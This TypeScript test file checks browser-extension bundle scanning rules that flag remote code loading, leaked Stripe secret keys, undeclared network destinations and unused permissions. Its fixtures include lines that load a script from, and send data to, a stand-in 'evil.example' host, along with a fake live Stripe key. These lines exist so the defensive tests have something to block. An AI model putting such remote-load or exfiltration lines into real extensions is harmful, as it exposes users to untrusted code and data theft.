/**
 * Family 3 (bundle-scanning security rules) tests. Fixtures are built at
 * RUNTIME under a fresh os.tmpdir() mkdtemp directory — mirrors the exact
 * approach used in tests/core-infra.test.ts (dist/ is gitignored, so a
 * committed fixture would be silently swallowed on a fresh clone).
 *
 * Every rule gets: MUST_BLOCK (fail fixture), MUST_PASS (pass fixture),
 * MUST_REFUSE (no build present -> inconclusive, exitCode 2, non-empty
 * reason — this is CORRECT behavior per build-precondition.ts, never a
 * failure of the test harness).
 */
import { describe, it, expect } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { zeroRemoteCode } from "../src/rules/zero-remote-code.js";
import { secretInBundle, STRIPE_SECRET_RE } from "../src/rules/secret-in-bundle.js";
import { networkDestinationInventory } from "../src/rules/network-destination-inventory.js";
import { permissionUnusedInCode } from "../src/rules/permission-unused-in-code.js";

function makeRoot(): string {
  return mkdtempSync(join(tmpdir(), "ed-fam3-"));
}

function writeBundle(root: string, files: Record<string, string>): void {
  const buildDir = join(root, "dist", "chrome");
  mkdirSync(buildDir, { recursive: true });
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(buildDir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
}

function writeManifest(root: string, manifest: Record<string, unknown>, atBuildDir = true): void {
  const target = atBuildDir ? join(root, "dist", "chrome", "manifest.json") : join(root, "manifest.json");
  writeFileSync(target, JSON.stringify(manifest, null, 2));
}

describe("zero-remote-code", () => {
  it("MUST_BLOCK: importScripts targeting a remote http URL", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nimportScripts("http://evil.example/x.js");\n`,
    });
    const result = await zeroRemoteCode.run(root);
    expect(result.verdict).toBe("fail");
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("importScripts");
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_PASS: importScripts only targets a local chunk", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nimportScripts("./local-chunk.js");\n`,
    });
    const result = await zeroRemoteCode.run(root);
    expect(result.verdict).toBe("pass");
    expect(result.findings.length).toBe(0);
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_REFUSE: no build present -> inconclusive with non-empty reason, exitCode 2", async () => {
    const root = makeRoot();
    const result = await zeroRemoteCode.run(root);
    expect(result.verdict).toBe("inconclusive");
    expect(result.exitCode).toBe(2);
    expect(result.inconclusive.length).toBeGreaterThan(0);
    expect(result.inconclusive[0].reason.length).toBeGreaterThan(10);
    rmSync(root, { recursive: true, force: true });
  });

  it("word-boundary: a business identifier named `evaluate` is not matched", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nfunction evaluate(x) { return x + 1; }\nevaluate(3);\n`,
    });
    const result = await zeroRemoteCode.run(root);
    expect(result.verdict).toBe("pass");
    rmSync(root, { recursive: true, force: true });
  });
});

describe("secret-in-bundle", () => {
  it("positive control: the CORRECTED regex matches a realistic sk_live_ Stripe key (naive sk_[A-Za-z0-9]{10,} would too, but this proves the corrected pattern works)", () => {
    const sample = 'const key = "sk_live_ABCDEFGHIJKLMNOP1234";';
    STRIPE_SECRET_RE.lastIndex = 0;
    expect(STRIPE_SECRET_RE.test(sample)).toBe(true);
  });

  it("MUST_BLOCK: a live Stripe secret key literal in the bundle", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nconst key = "sk_live_ABCDEFGHIJKLMNOP1234";\n`,
    });
    const result = await secretInBundle.run(root);
    expect(result.verdict).toBe("fail");
    expect(result.findings.some((f) => f.message.includes("Stripe"))).toBe(true);
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_PASS: a fake_-prefixed test key is allowlisted", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nconst fake_key = "sk_test_ABCDEFGHIJKLMNOP1234";\n`,
    });
    const result = await secretInBundle.run(root);
    expect(result.verdict).toBe("pass");
    expect(result.findings.length).toBe(0);
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_REFUSE: no build present -> inconclusive with non-empty reason, exitCode 2", async () => {
    const root = makeRoot();
    const result = await secretInBundle.run(root);
    expect(result.verdict).toBe("inconclusive");
    expect(result.exitCode).toBe(2);
    expect(result.inconclusive[0].reason.length).toBeGreaterThan(10);
    rmSync(root, { recursive: true, force: true });
  });
});

describe("network-destination-inventory", () => {
  it("MUST_BLOCK: literal fetch to a destination not in host_permissions", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nfetch("https://evil.example/collect");\n`,
    });
    writeManifest(root, {
      manifest_version: 3,
      name: "fixture",
      version: "0.0.1",
      host_permissions: ["https://kindred-spaniel-455.convex.cloud/*"],
    });
    const result = await networkDestinationInventory.run(root);
    expect(result.verdict).toBe("fail");
    expect(result.findings.some((f) => f.message.includes("evil.example"))).toBe(true);
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_PASS: literal fetch destination is covered by host_permissions", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nfetch("https://kindred-spaniel-455.convex.cloud/api");\n`,
    });
    writeManifest(root, {
      manifest_version: 3,
      name: "fixture",
      version: "0.0.1",
      host_permissions: ["https://kindred-spaniel-455.convex.cloud/*"],
    });
    const result = await networkDestinationInventory.run(root);
    expect(result.verdict).toBe("pass");
    expect(result.findings.length).toBe(0);
    rmSync(root, { recursive: true, force: true });
  });

  it("TRIPOLAR: a dynamic fetch(x.content) arg is reported inconclusive/indicative, never counted as clean pass — mirrors the 3 real dynamic fetch() call sites in the gptpowerups-extension bundle (matrix §7 item 10)", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture, mirrors real dynamic-fetch shape from gptpowerups-extension\nfunction send(x) { fetch(x.content); }\n`,
    });
    writeManifest(root, {
      manifest_version: 3,
      name: "fixture",
      version: "0.0.1",
      host_permissions: ["https://kindred-spaniel-455.convex.cloud/*"],
    });
    const result = await networkDestinationInventory.run(root);
    expect(result.verdict).toBe("inconclusive");
    expect(result.findings.length).toBe(0);
    expect(result.inconclusive.length).toBeGreaterThan(0);
    expect(result.inconclusive[0].reason).toContain("x.content");
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_REFUSE: no build present -> inconclusive with non-empty reason, exitCode 2", async () => {
    const root = makeRoot();
    const result = await networkDestinationInventory.run(root);
    expect(result.verdict).toBe("inconclusive");
    expect(result.exitCode).toBe(2);
    expect(result.inconclusive[0].reason.length).toBeGreaterThan(10);
    rmSync(root, { recursive: true, force: true });
  });
});

describe("permission-unused-in-code", () => {
  it("MUST_BLOCK: alarms permission declared, zero chrome.alarms use in bundle", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nchrome.storage.local.get(["x"], () => {});\n`,
    });
    writeManifest(root, {
      manifest_version: 3,
      name: "fixture",
      version: "0.0.1",
      permissions: ["alarms", "storage"],
    });
    const result = await permissionUnusedInCode.run(root);
    expect(result.verdict).toBe("fail");
    expect(result.findings.some((f) => f.message.includes("alarms"))).toBe(true);
    expect(result.findings.some((f) => f.message.includes("storage"))).toBe(false);
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_PASS: storage permission declared and chrome.storage used", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nchrome.storage.local.get(["x"], () => {});\n`,
    });
    writeManifest(root, {
      manifest_version: 3,
      name: "fixture",
      version: "0.0.1",
      permissions: ["storage"],
    });
    const result = await permissionUnusedInCode.run(root);
    expect(result.verdict).toBe("pass");
    expect(result.findings.length).toBe(0);
    rmSync(root, { recursive: true, force: true });
  });

  it("bracket-notation access counts as used, not a false unused", async () => {
    const root = makeRoot();
    writeBundle(root, {
      "sw.js": `// synthetic fam3 fixture\nchrome["alarms"].create("x", {});\n`,
    });
    writeManifest(root, {
      manifest_version: 3,
      name: "fixture",
      version: "0.0.1",
      permissions: ["alarms"],
    });
    const result = await permissionUnusedInCode.run(root);
    expect(result.verdict).toBe("pass");
    rmSync(root, { recursive: true, force: true });
  });

  it("MUST_REFUSE: no build present -> inconclusive with non-empty reason, exitCode 2", async () => {
    const root = makeRoot();
    const result = await permissionUnusedInCode.run(root);
    expect(result.verdict).toBe("inconclusive");
    expect(result.exitCode).toBe(2);
    expect(result.inconclusive[0].reason.length).toBeGreaterThan(10);
    rmSync(root, { recursive: true, force: true });
  });
});
